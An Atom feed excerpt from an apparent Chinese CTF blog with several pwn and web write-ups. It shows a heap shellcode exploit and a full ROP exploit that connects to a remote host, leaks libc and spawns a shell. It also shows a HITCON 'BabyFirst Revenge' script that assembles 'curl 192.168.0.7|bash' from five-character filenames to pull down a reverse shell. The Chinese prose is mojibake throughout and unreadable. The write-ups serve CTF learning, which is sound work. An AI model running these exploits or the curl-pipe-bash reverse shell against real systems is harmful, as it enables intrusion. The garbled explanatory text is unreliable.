class="string">b"\xeb\x19"</span>)</span><br><span class="line">add(<span class="number">2</span>, asm(<span class="string">'xor rdx, rdx'</span>)+<span class="string">b"\x90\x90\xeb\x19"</span>)</span><br><span class="line">add(<span class="number">3</span>, asm(<span class="string">'syscall'</span>).rjust(<span class="number">7</span>, <span class="string">b'\x90'</span>)  <span class="comment"># ljust/rjust åœ¨è¿™é‡Œæ²¡æœ‰åŒºåˆ«</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong></p><p>è¿™é‡Œæˆ‘çœ‹å…¶ä»–å¸ˆå‚…å†™çš„wpæ—¶æœ‰ä¸ªç–‘æƒ‘çš„åœ°æ–¹ï¼Œè¿™é‡Œ<code>free_got-heap_addr</code>çš„å€¼æ˜¯<code>-17</code>ï¼Œä¹Ÿå°±æ˜¯è¯´dele(0)åœ¨æŠŠ<code>/bin/sh</code>å¼¹å…¥rdiåï¼Œæ˜¯ä»array[-17]å¼€å§‹æ‰§è¡Œçš„ï¼Œä¸‹ä¸€ä¸ªå †å—æ˜¯array[1]ï¼Œä½†æ˜¯<code>jmp short xxx</code>æ—¶çš„offsetä¾ç„¶æ˜¯0x19ï¼Œç”±äºæˆ‘å¯¹å †å—çš„åˆ†é…è§„åˆ™ä¸å¤ªç†Ÿæ‚‰ï¼Œè¿™é‡Œæˆ‘æ€è€ƒäº†è®¸ä¹…ï¼ŒçŒœæµ‹<strong>å †å—</strong>æ˜¯ä»¥<strong>ç±»ä¼¼é“¾è¡¨</strong>çš„å½¢å¼è¿åœ¨ä¸€èµ·çš„ï¼ŒæŒ‰ç…§åˆ›å»ºçš„å…ˆåé¡ºåºä¾æ¬¡é“¾æ¥ï¼Œæ‰€ä»¥æ‰ä¼š-17ä¹‹åæ˜¯1è¿™æ ·ï¼Œè€Œä¸èƒ½è¢«ä¹‹å‰é‚£å¼ è®¡ç®—åç§»çš„å›¾æ‰€è¯¯å¯¼ã€‚</p><p><img src="https://i.loli.net/2020/10/08/NpSl9dWwfaOLHGK.png" alt="chunk_link"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å®³ï¼Œæƒ³åŠ å¸ˆå‚…å¥½å‹é—®æ¸…æ¥šæ˜¯ä¸æ˜¯æˆ‘æƒ³çš„é‚£æ ·ï¼Œç°åœ¨è¿˜æ²¡é€šè¿‡ç”³è¯·2333</p><p>ç¡äº†ç¡äº†ï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åšåˆ°çš„ç¬¬ä¸€ä¸ªå †é¢˜ï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯æœ‰ä¸¶éš¾åº¦ï¼Œé‚è®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åˆ†æ&quot; class=&quot;he
      
    
    </summary>
    
    
    
      <category term="Pwn" scheme="https://www.sketchplane.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-welpwn</title>
    <link href="https://www.sketchplane.top/2020/09/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-welpwn/"/>
    <id>https://www.sketchplane.top/2020/09/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-welpwn/</id>
    <published>2020-09-09T14:50:51.000Z</published>
    <updated>2020-10-08T13:34:32.781Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹…è¿åœ°æ›´æ–°åšå®¢äº†ï¼Œå…ˆæ°´ä¸€ç¯‡é¢˜è§£å§ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="https://t1.picb.cc/uploads/2020/09/09/tFFLE0.png" alt="checksec"></p><p>å‘ç°å¼€äº†NXï¼Œæ ˆä¸å¯æ‰§è¡Œäº†ã€‚</p><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p><img src="https://t1.picb.cc/uploads/2020/09/09/tFFse1.png" alt="ida"></p><p>è¿™é‡Œæ˜¯æŠŠä¼ è¿›æ¥çš„bufé€å­—èŠ‚èµ‹å€¼ç»™s2ï¼Œè¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œs2å¤§å°æ˜¯0x10ï¼Œä½†æ˜¯bufæœ‰0x400ï¼Œæ˜¾ç„¶è¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºã€‚</p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>é—®é¢˜åœ¨äºè¿™ä¸ªforå¾ªç¯ï¼Œå®ƒçš„ç»“æŸæ¡ä»¶æ˜¯è¯»åˆ°\x00å­—èŠ‚ã€‚æ¢å¥è¯è¯´å°±æ˜¯å½“å®ƒåœ¨bufä¸­è¯»åˆ°00å­—èŠ‚çš„æ—¶å€™å°±ä¼šåœæ­¢æ‹·è´å­—ç¬¦ä¸²åˆ°s2ï¼Œè¿™å°±å­˜åœ¨ä¸€ä¸ªé—®é¢˜ ï¼Œä¹‹å‰çš„æº¢å‡ºå¥½è¯´ï¼Œä½†æ˜¯è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™ï¼Œå¿…ç„¶ä¼šå‡ºç°00å­—èŠ‚çš„æƒ…å†µï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬çš„rop chainså°†åˆ°æ­¤ç»ˆæ­¢ã€‚</p><img src="https://t1.picb.cc/uploads/2020/09/09/tFFY8D.png" alt="stack" style="zoom:50%;" /><p>æ ¹æ®å‡½æ•°è°ƒç”¨æ ˆçš„ä¼ å‚è§„åˆ™ï¼Œmainå‡½æ•°æ ˆå¸§å’Œechoå‡½æ•°æ ˆå¸§çš„ä¸»è¦ç»“æ„å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨gdbéªŒè¯ä¸‹ï¼š</p><p><img src="https://t1.picb.cc/uploads/2020/09/09/tFFKwu.png" alt="offset check"></p><p>å¯ä»¥çœ‹åˆ°bufå’Œs2çš„è·ç¦»å°±æ˜¯0x20ï¼Œä¹Ÿå°±æ˜¯ç›¸è·4ä¸ªQwordã€‚</p><p>ç”±äºåœ¨è¦†ç›–è¿”å›åœ°å€ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬æ¥ç€è¾“å…¥æ„é€  rop çš„ gadgetsæ˜¯ä¼šæˆªæ–­çš„ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨pop4çš„gadgetæ¥å®ç°â€è·³è·ƒâ€œ</p><img src="https://t1.picb.cc/uploads/2020/09/09/tFFdBv.png" alt="stack2" style="zoom:50%;" /><p>å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬è¿™æ ·è¾“å…¥ï¼Œs2å¤„å¡«å…¥pop4åè¿˜æ˜¯ä¼šåœæ­¢å¤åˆ¶æ²¡é”™ï¼Œä¸è¿‡æˆ‘ä»¬å› ä¸ºpop4ä¸ªQword çš„æ•°æ®ï¼Œç¨‹åºå› æ­¤ä¼šæ‰§è¡Œåˆ°bufå¤„pop4åé¢çš„æŒ‡ä»¤ï¼Œå³å¯æ„é€ rop chainsã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54825</span>)</span><br><span class="line"><span class="comment">#io = process('./welpwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">pop_4= <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">padding = <span class="number">0x18</span></span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'A'</span>*padding + p64(pop_4) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'to RCTF\n'</span>, payload1)</span><br><span class="line">io.recvuntil(<span class="string">'\x40'</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span>*padding + p64(pop_4) + p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>LibcSearcheræ˜¯ç¬¬ä¸€æ¬¡ç”¨ï¼Œå¯ä»¥æ–¹ä¾¿åœ°è·å–libcçš„åç§»ï¼Œå‡å°‘é‡å¤åŠ³åŠ¨ã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆio.recvuntil(â€˜\x40â€™)ï¼Œè‡ªå·±å†™å†™expå°±ä¼šçŸ¥é“äº†= =</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¯ä¸€é“é¢˜éƒ½ä»”ç»†å†™wpæœ‰ä¸¶éº»çƒ¦ï¼Œé—²ç€æ²¡äº‹å¹²çš„æ—¶å€™(ä¸æƒ³åšé¢˜)å°±æ°´ä¸€ç¯‡å§ï¼ˆ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¹…è¿åœ°æ›´æ–°åšå®¢äº†ï¼Œå…ˆæ°´ä¸€ç¯‡é¢˜è§£å§ã€‚&lt;/p&gt;
&lt;h2 id=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åˆ†æ&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
    
    
      <category term="Pwn" scheme="https://www.sketchplane.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>RCEçš„é‚£äº›äº‹å„¿</title>
    <link href="https://www.sketchplane.top/2020/04/07/RCE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"/>
    <id>https://www.sketchplane.top/2020/04/07/RCE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</id>
    <published>2020-04-07T13:40:18.000Z</published>
    <updated>2020-09-09T14:52:15.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™é‡Œç”¨æ¥è®°å½•ä¸€ä¸‹è‡ªå·±åšé¢˜è¿‡ç¨‹ä¸­é‡åˆ°æœ‰è¶£çš„RCEï½</p><h2 id="5ä¸ªå­—ç¬¦getshell"><a href="#5ä¸ªå­—ç¬¦getshell" class="headerlink" title="5ä¸ªå­—ç¬¦getshell"></a>5ä¸ªå­—ç¬¦getshell</h2><p>é¢˜ç›®ï¼š<strong>BabyFirst Revenge</strong></p><p>HITCON CTF 2017çš„é¢˜ç›®ï¼Œä¹‹å‰å·²ç»äº†è§£è¿‡æ€è·¯ï¼Œè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> $_SERVER[<span class="string">'REMOTE_ADDR'</span>].<span class="string">"\n"</span>;</span><br><span class="line">   $sandbox = <span class="string">'./sanbox'</span>;</span><br><span class="line">   mkdir($sandbox);</span><br><span class="line">   chdir($sandbox);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">       <span class="keyword">echo</span> $_GET[<span class="string">'cmd'</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">       exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>Linuxä¸­ï¼Œä½¿ç”¨<code>\</code>å¯ä»¥æ¢è¡Œè¾“å…¥å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adu1t@ubuntu:~$ who\</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> am\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> i</span></span><br><span class="line">adu1t</span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œå‘½ä»¤ä¸éœ€è¦å®Œå…¨æ­£ç¡®ï¼Œåªéœ€è¦åŒ…å«æœ‰æ­£ç¡®çš„å‘½ä»¤å³å¯æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">adu1t@ubuntu:~$ cat 1.txt </span><br><span class="line">sketch_pl4ne_wants_a_girlfriend.</span><br><span class="line">who\</span><br><span class="line">am\</span><br><span class="line">i</span><br><span class="line"></span><br><span class="line">adu1t@ubuntu:~$ sh 1.txt</span><br><span class="line">1.txt: 1: 1.txt: sketch_pl4ne_wants_a_girlfriend.: not found</span><br><span class="line">adu1t</span><br></pre></td></tr></table></figure><p>&gt;xï¼Œåˆ›å»ºä¸€ä¸ªåä¸ºxçš„ç©ºæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adu1t@ubuntu:~/Desktop$ &gt;x</span><br><span class="line">adu1t@ubuntu:~/Desktop$ ls</span><br><span class="line">x</span><br></pre></td></tr></table></figure><p><code>ls -t</code>å‘½ä»¤ï¼Œå°†åˆ›å»ºçš„æ–‡ä»¶æŒ‰åˆ›å»ºæ—¶é—´æ’åº(ååˆ›å»ºåœ¨å‰)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adu1t@ubuntu:~/Desktop$ &gt;1</span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;2</span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;3</span><br><span class="line">adu1t@ubuntu:~/Desktop$ ls</span><br><span class="line">1  2  3</span><br><span class="line">adu1t@ubuntu:~/Desktop$ ls -t</span><br><span class="line">3  2  1</span><br></pre></td></tr></table></figure><p>çŸ¥é“è¿™äº›ä¹‹åæˆ‘ä»¬åº”è¯¥å°±èƒ½ç†è§£æ€è·¯äº†ã€‚</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>åˆ©ç”¨<code>ls -t</code> æ„é€ å«æœ‰æ¶æ„ä»£ç çš„æ–‡ä»¶ååºåˆ—ï¼Œè¾“å‡ºåˆ°æ–‡ä»¶<code>a</code>ä¸­ï¼Œsh æ‰§è¡Œå³å¯ã€‚</p><h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># æ„é€ bæ–‡ä»¶ï¼Œé‡Œé¢æ˜¯æ„é€ çš„ls -t&gt;aå‘½ä»¤</span></span><br><span class="line">    <span class="string">"&gt;l\\"</span>,</span><br><span class="line">    <span class="string">"&gt;s\ \\"</span>,</span><br><span class="line">    <span class="string">"&gt;\&gt;a"</span>,</span><br><span class="line">    <span class="string">"&gt;-t\\"</span>,</span><br><span class="line">    <span class="string">"ls&gt;b"</span>,</span><br><span class="line">    <span class="string">"ls&gt;&gt;b"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ„é€  curl 192.168.0.7|bash è¿™é‡Œipçš„indexæ–‡ä»¶é‡Œå†™åå¼¹shellçš„è¯­å¥ç„¶åç›‘å¬å¯¹åº”ç«¯å£</span></span><br><span class="line">    <span class="comment"># æ³¨æ„ä¸¤ä¸ªç‚¹ï¼šä¸è¦åˆ›å»ºåŒåæ–‡ä»¶(è¦†ç›–);ä¸è¦ä»¥.xåˆ›å»ºæ–‡ä»¶(lså‘½ä»¤ä¸ä¼šæ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶ï¼Œå¯¼è‡´å‘½ä»¤ç¼ºå¤±)</span></span><br><span class="line">    <span class="string">"&gt;sh"</span>,</span><br><span class="line">    <span class="string">"&gt;ba\\"</span>,</span><br><span class="line">    <span class="string">"&gt;\|\\"</span>,</span><br><span class="line">    <span class="string">"&gt;7\\"</span>,</span><br><span class="line">    <span class="string">"&gt;0.\\"</span>,</span><br><span class="line">    <span class="string">"&gt;8.\\"</span>,</span><br><span class="line">    <span class="string">"&gt;16\\"</span>,</span><br><span class="line">    <span class="string">"&gt;2.\\"</span>,</span><br><span class="line">    <span class="string">"&gt;19\\"</span>,</span><br><span class="line">    <span class="string">"&gt;\\"</span>,</span><br><span class="line">    <span class="string">"&gt;\ \\"</span>,</span><br><span class="line">    <span class="string">"&gt;rl\\"</span>,</span><br><span class="line">    <span class="string">"&gt;cu\\"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="string">"sh b"</span>,</span><br><span class="line">    <span class="string">"sh a"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://192.168.246.129/index.php?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">    requests.get(<span class="string">'http://192.168.246.129/index.php?cmd='</span> + quote(i))</span><br><span class="line">    <span class="comment"># print r.text</span></span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªåˆ†æå‘½ä»¤<code>ls -t</code>çš„æ„é€ è¿‡ç¨‹ï¼Œå› ä¸ºç›¸å¯¹äºä¸Šä¸€ä¸ªç‰ˆæœ¬(<del>7ä¸ªå­—ç¬¦è¿˜æ˜¯å‡ ä¸ªï¼Œæˆ‘ç»™å¿˜äº†</del>)ï¼Œéš¾ç‚¹åœ¨äºè¿™æ¡å‘½ä»¤è¶…è¿‡äº†å­—ç¬¦æ•°é™åˆ¶ï¼Œå…¶ä»–çš„æ„é€ å®Œå…¨å¯ä»¥ä»¥æ•°é‡å¼¥è¡¥å­—ç¬¦æ•°ã€‚</p><p>æˆ‘ä»¬å•ç‹¬æ‹å‡ºæ¥çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">adu1t@ubuntu:~/Desktop$ &gt;l\\</span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;s\ \\</span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;\&gt;a</span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;-t\\</span><br><span class="line">adu1t@ubuntu:~/Desktop$ ls&gt;b</span><br><span class="line">adu1t@ubuntu:~/Desktop$ ls&gt;&gt;b</span><br><span class="line">adu1t@ubuntu:~/Desktop$ cat -n b</span><br><span class="line">     1&gt;a</span><br><span class="line">     2b</span><br><span class="line">     3l\</span><br><span class="line">     4s \</span><br><span class="line">     5-t\</span><br><span class="line">     6&gt;a</span><br><span class="line">     7b</span><br><span class="line">     8l\</span><br><span class="line">     9s \</span><br><span class="line">    10-t\</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ ·ç¡®å®åœ¨3-5è¡Œå¤„æ„é€ å‡ºäº†æˆ‘ä»¬æƒ³è¦çš„ä»£ç <code>ls -t&gt;a</code>ã€‚</p><p>è¯´ä¸€ä¸‹è¿™é‡Œæ¯”è¾ƒç»†èŠ‚çš„å‡ ä¸ªåœ°æ–¹å§ï¼š</p><ul><li>så¿…é¡»å’Œç©ºæ ¼åšè¿ä½“å©´å„¿ï¼Œå› ä¸ºç©ºæ ¼æ‰“å¤´ä¼šæ’åœ¨æ‰€æœ‰å­—æ¯æ•°å­—ä¹‹å‰ :(</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adu1t@ubuntu:~/Desktop$ &gt;\ </span><br><span class="line">adu1t@ubuntu:~/Desktop$ ls</span><br><span class="line">' '   1   2   a   b</span><br></pre></td></tr></table></figure><ul><li>è¾“å‡ºçš„æ–‡ä»¶åä¹Ÿæ˜¯æœ‰è®²ç©¶çš„ï¼Œç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬è¦æ„é€ çš„ç¬¬ä¸€æ¬¡æ‰§è¡Œçš„æ–‡ä»¶çš„å­—æ¯æ’åºè¦åœ¨ç¬¬äºŒæ¬¡æ‰§è¡Œçš„æ–‡ä»¶å­—æ¯æ’åºçš„åé¢ã€‚ä¹Ÿå°±æ˜¯è¿™é‡Œçš„ascii(â€˜aâ€™)&lt;ascii(â€˜bâ€™)ï¼ŒåŸå› æ˜¯<code>&gt;a</code>æ–‡ä»¶ä¼šæ’åœ¨<code>b</code>æ–‡ä»¶çš„å‰é¢ï¼Œè¿™é‡Œè‡ªå·±è¯•éªŒå°±çŸ¥é“äº†ã€‚</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> é”™è¯¯ç¤ºèŒƒ</span></span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;l\\</span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;s\ \\</span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;\&gt;b</span><br><span class="line">adu1t@ubuntu:~/Desktop$ &gt;-t\\</span><br><span class="line">adu1t@ubuntu:~/Desktop$ ls&gt;a</span><br><span class="line">adu1t@ubuntu:~/Desktop$ ls&gt;&gt;a</span><br><span class="line">adu1t@ubuntu:~/Desktop$ cat a</span><br><span class="line">a</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">b</span></span><br><span class="line">l\</span><br><span class="line">s \</span><br><span class="line">-t\</span><br><span class="line">a</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">b</span></span><br><span class="line">l\</span><br><span class="line">s \</span><br><span class="line">-t\</span><br></pre></td></tr></table></figure><p>åé¢æ„é€ curlå‘½ä»¤åå¼¹shellæˆ‘å†™çš„è„šæœ¬æ³¨é‡Šå·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œä¸å¤šèµ˜è¿°ã€‚</p><h2 id="å–ågetshell"><a href="#å–ågetshell" class="headerlink" title="å–ågetshell"></a>å–ågetshell</h2><p><strong>ä»…é€‚ç”¨äºphp7.0ç‰ˆæœ¬ï¼</strong></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    